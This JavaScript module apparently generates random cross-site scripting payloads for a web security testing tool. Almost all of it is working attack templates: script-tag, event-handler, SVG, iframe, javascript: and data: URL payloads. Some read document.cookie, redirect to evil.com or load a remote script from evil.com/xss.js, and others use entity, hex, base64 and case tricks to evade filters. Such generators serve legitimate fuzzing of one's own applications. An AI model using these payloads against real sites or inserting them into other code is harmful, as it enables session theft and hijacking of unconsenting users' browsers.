/**
 * Payload Generator Utility
 * Generates random XSS payloads using template-based approach with randomization
 */

// Random number generator for payload variations
const randomNum = () => Math.floor(Math.random() * 100) + 1;

// Random choice from array
const randomChoice = (arr) => arr[Math.floor(Math.random() * arr.length)];

// Random boolean with probability
const randomBool = (probability = 0.5) => Math.random() < probability;

// Base64 encode helper
const toBase64 = (str) => {
  try {
    return btoa(str);
  } catch (e) {
    // Fallback for non-ASCII characters
    return btoa(unescape(encodeURIComponent(str)));
  }
};

// JavaScript payloads for script injection
const JS_PAYLOADS = [
  'alert(1)',
  'alert(document.domain)',
  'alert(document.cookie)',
  'alert(window.origin)',
  'prompt(1)',
  'confirm(1)',
  'console.log(1)',
  'eval("alert(1)")',
  'window.location="//evil.com"'
];

// Event handlers
const EVENT_HANDLERS = [
  'onerror', 'onload', 'onclick', 'onmouseover', 'onfocus',
  'onblur', 'onchange', 'onsubmit', 'oninput', 'onmouseenter',
  'onmouseleave', 'ondblclick', 'onkeypress', 'onkeydown',
  'onbeforeunload', 'onanimationend', 'ontransitionend'
];

// HTML tags
const HTML_TAGS = [
  'img', 'svg', 'body', 'input', 'div', 'iframe', 'object',
  'embed', 'video', 'audio', 'details', 'summary', 'marquee',
  'form', 'button', 'select', 'textarea', 'keygen'
];

// HTML attributes
const HTML_ATTRIBUTES = [
  'src', 'href', 'data', 'action', 'formaction', 'poster',
  'background', 'cite', 'codebase', 'profile', 'usemap'
];

// Quote styles
const QUOTE_STYLES = ['"', "'", ''];

// Whitespace variations
const WHITESPACE = ['', ' ', '\t', '\n', '\r', ' \t', '\n\t'];

// Comments
const COMMENTS = ['/**/', '<!--', '-->', '/* test */', '// comment\n'];

/**
 * 1. Script Tag Templates (20% weight)
 */
function generateScriptTag() {
  const jsPayload = randomChoice(JS_PAYLOADS);
  const num = randomNum();
  const quote = randomChoice(QUOTE_STYLES);
  const ws = randomChoice(WHITESPACE);

  const templates = [
    `<script>${jsPayload}</script>`,
    `<script${ws}>${jsPayload}</script>`,
    `<script>alert(${num})</script>`,
    `<script src=${quote}//evil.com/xss.js${quote}></script>`,
    `<script/**/>${jsPayload}</script>`,
    `<script>/**/alert(${num})/**/</script>`,
    `<script>eval("${jsPayload}")</script>`,
    `<script>prompt(${num})</script>`,
    `<script>confirm(${num})</script>`,
    `<script>setTimeout("${jsPayload}",0)</script>`
  ];

  return {
    payload: randomChoice(templates),
    category: 'script-tag',
    technique: 'script',
    context: 'html',
    generated: true
  };
}

/**
 * 2. Event Handler Templates (30% weight)
 */
function generateEventHandler() {
  const tag = randomChoice(HTML_TAGS);
  const event = randomChoice(EVENT_HANDLERS);
  const jsPayload = randomChoice(JS_PAYLOADS);
  const attr = randomChoice(HTML_ATTRIBUTES);
  const quote = randomChoice(QUOTE_STYLES);
  const ws = randomChoice(WHITESPACE);
  const num = randomNum();

  const templates = [
    `<img src=x ${event}=alert(${num})>`,
    `<svg/${event}=alert(${num})>`,
    `<${tag} ${event}=alert(${num})>`,
    `<${tag}${ws}${event}=${quote}${jsPayload}${quote}>`,
    `<img ${attr}=x ${event}=alert(${num})>`,
    `<${tag} autofocus ${event}=alert(${num})>`,
    `<body ${event}=${quote}alert(${num})${quote}>`,
    `<input ${event}=${jsPayload} autofocus>`,
    `<details open ${event}=alert(${num})>`,
    `<select ${event}=alert(${num})><option>click</option></select>`
  ];

  return {
    payload: randomChoice(templates),
    category: 'event-handler',
    technique: event,
    context: 'html',
    generated: true
  };
}

/**
 * 3. SVG-based Templates (15% weight)
 */
function generateSVG() {
  const jsPayload = randomChoice(JS_PAYLOADS);
  const num = randomNum();
  const ws = randomChoice(WHITESPACE);

  const templates = [
    `<svg><script>${jsPayload}</script></svg>`,
    `<svg/onload=alert(${num})>`,
    `<svg${ws}onload=${jsPayload}>`,
    `<svg><animate onbegin=alert(${num}) />`,
    `<svg><set attributeName=onload to=alert(${num})>`,
    `<svg><script>alert(${num})</script></svg>`,
    `<svg><foreignObject><body onload=alert(${num})></foreignObject></svg>`,
    `<svg><use xlink:href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(${num})</script></svg>#x" />`,
    `<svg onload=alert(${num})//`,
    `<math><mtext><table><mglyph><svg onload=alert(${num})>`
  ];

  return {
    payload: randomChoice(templates),
    category: 'svg',
    technique: 'svg-injection',
    context: 'html',
    generated: true
  };
}

/**
 * 4. Protocol Handler Templates (15% weight)
 */
function generateProtocolHandler() {
  const jsPayload = randomChoice(JS_PAYLOADS);
  const num = randomNum();
  const scriptTag = `<script>alert(${num})</script>`;
  const base64Script = toBase64(scriptTag);

  const templates = [
    `javascript:alert(${num})`,
    `javascript:${jsPayload}`,
    `data:text/html,${scriptTag}`,
    `data:text/html,<body onload=alert(${num})>`,
    `data:text/html;base64,${base64Script}`,
    `data:text/html;charset=utf-8,<script>alert(${num})</script>`,
    `vbscript:msgbox(${num})`,
    `javascript:void(${jsPayload})`,
    `javascript://comment%0aalert(${num})`,
    `data:,alert(${num})`
  ];

  return {
    payload: randomChoice(templates),
    category: 'protocol-handler',
    technique: 'protocol',
    context: 'url',
    generated: true
  };
}

/**
 * 5. Iframe-based Templates (10% weight)
 */
function generateIframe() {
  const jsPayload = randomChoice(JS_PAYLOADS);
  const num = randomNum();
  const quote = randomChoice(QUOTE_STYLES);

  const templates = [
    `<iframe src=${quote}javascript:alert(${num})${quote}>`,
    `<iframe srcdoc=${quote}<script>alert(${num})</script>${quote}>`,
    `<iframe onload=alert(${num})>`,
    `<iframe src=javascript:${jsPayload}>`,
    `<iframe srcdoc="<body onload=alert(${num})>">`,
    `<iframe src=data:text/html,<script>alert(${num})</script>>`,
    `<iframe src=//evil.com onload=alert(${num})>`,
    `<iframe src=x ${randomChoice(EVENT_HANDLERS)}=alert(${num})>`,
    `<iframe sandbox=allow-scripts srcdoc="<script>alert(${num})</script>">`,
    `<iframe name=alert(${num})>`
  ];

  return {
    payload: randomChoice(templates),
    category: 'iframe',
    technique: 'iframe-injection',
    context: 'html',
    generated: true
  };
}

/**
 * 6. Attribute-based Templates (5% weight)
 */
function generateAttributeBased() {
  const jsPayload = randomChoice(JS_PAYLOADS);
  const num = randomNum();
  const quote = randomChoice(QUOTE_STYLES);

  const templates = [
    `<a href=${quote}javascript:alert(${num})${quote}>click</a>`,
    `<form action=${quote}javascript:alert(${num})${quote}><input type=submit>`,
    `<object data=${quote}javascript:alert(${num})${quote}>`,
    `<embed src=javascript:alert(${num})>`,
    `<link rel=import href=data:text/html,<script>alert(${num})</script>>`,
    `<base href=javascript:alert(${num})//>`,
    `<video src=x onerror=alert(${num})>`,
    `<audio src=x onerror=alert(${num})>`,
    `<button formaction=javascript:alert(${num})>click</button>`,
    `<input type=image src=x formaction=javascript:alert(${num})>`
  ];

  return {
    payload: randomChoice(templates),
    category: 'attribute',
    technique: 'attribute-injection',
    context: 'html',
    generated: true
  };
}

/**
 * 7. Encoded/Obfuscated Templates (5% weight)
 */
function generateEncoded() {
  const num = randomNum();
  const jsPayload = randomChoice(JS_PAYLOADS);

  // HTML entity encode
  const entityEncoded = 'alert(1)'.split('').map(c =>
    `&#${c.charCodeAt(0)};`
  ).join('');

  // Hex encode
  const hexEncoded = 'alert(1)'.split('').map(c =>
    `&#x${c.charCodeAt(0).toString(16)};`
  ).join('');

  // Character codes
  const charCodes = [97, 108, 101, 114, 116, 40, 49, 41]; // alert(1)

  const base64Alert = toBase64(jsPayload);

  const templates = [
    `<img src=x onerror="${entityEncoded}">`,
    `<img src=x onerror="${hexEncoded}">`,
    `<svg><script>eval(String.fromCharCode(${charCodes.join(',')}))</script></svg>`,
    `<img src=x onerror=eval(atob('${base64Alert}'))>`,
    `<svg><script>eval(atob('${base64Alert}'))</script></svg>`,
    `<img src=x onerror="&#x61;lert(${num})">`,
    `<svg onload=&#97;&#108;&#101;&#114;&#116;(${num})>`,
    `<img src=x onerror=\u0061lert(${num})>`,
    `<script>eval('\\u0061lert(${num})')</script>`,
    `<img src=x onerror=eval('\\x61lert(${num})')>`
  ];

  return {
    payload: randomChoice(templates),
    category: 'encoded',
    technique: 'encoding',
    context: 'html',
    generated: true
  };
}

/**
 * Category generators with weights
 */
const GENERATORS = [
  { generator: generateScriptTag, weight: 20 },
  { generator: generateEventHandler, weight: 30 },
  { generator: generateSVG, weight: 15 },
  { generator: generateProtocolHandler, weight: 15 },
  { generator: generateIframe, weight: 10 },
  { generator: generateAttributeBased, weight: 5 },
  { generator: generateEncoded, weight: 5 }
];

// Calculate cumulative weights
const totalWeight = GENERATORS.reduce((sum, g) => sum + g.weight, 0);
const cumulativeWeights = [];
let cumulative = 0;
GENERATORS.forEach(g => {
  cumulative += g.weight;
  cumulativeWeights.push({ generator: g.generator, threshold: cumulative / totalWeight });
});

/**
 * Select a random generator based on weights
 */
function selectGenerator() {
  const rand = Math.random();
  for (const { generator, threshold } of cumulativeWeights) {
    if (rand <= threshold) {
      return generator;
    }
  }
  return GENERATORS[0].generator; // Fallback
}

/**
 * Apply random variations to a payload
 */
function applyRandomVariations(payload) {
  let result = payload;

  // Random whitespace insertion (20% chance)
  if (randomBool(0.2)) {
    const ws = randomChoice(WHITESPACE);
    result = result.replace(/<(\w+)/, `<${ws}$1`);
  }

  // Random case variation on tag name (10% chance)
  if (randomBool(0.1)) {
    result = result.replace(/<(\w+)/, (match, tag) => {
      return '<' + tag.split('').map(c =>
        randomBool(0.5) ? c.toUpperCase() : c.toLowerCase()
      ).join('');
    });
  }

  // Random comment insertion (5% chance)
  if (randomBool(0.05)) {
    const comment = randomChoice(COMMENTS);
    result = result.replace(/>/, `>${comment}`);
  }

  return result;
}

/**
 * Generate random XSS payloads
 * @param {number} count - Number of payloads to generate
 * @param {object} options - Generation options
 * @returns {array} Array of generated payload objects
 */
export function generateRandomPayloads(count = 10, options = {}) {
  const {
    applyVariations = true
  } = options;

  const payloads = [];

  for (let i = 0; i < count; i++) {
    const generator = selectGenerator();
    let payloadObj = generator();

    // Apply random variations
    if (applyVariations && randomBool(0.3)) {
      payloadObj.payload = applyRandomVariations(payloadObj.payload);
    }

    payloads.push(payloadObj);
  }

  return payloads;
}
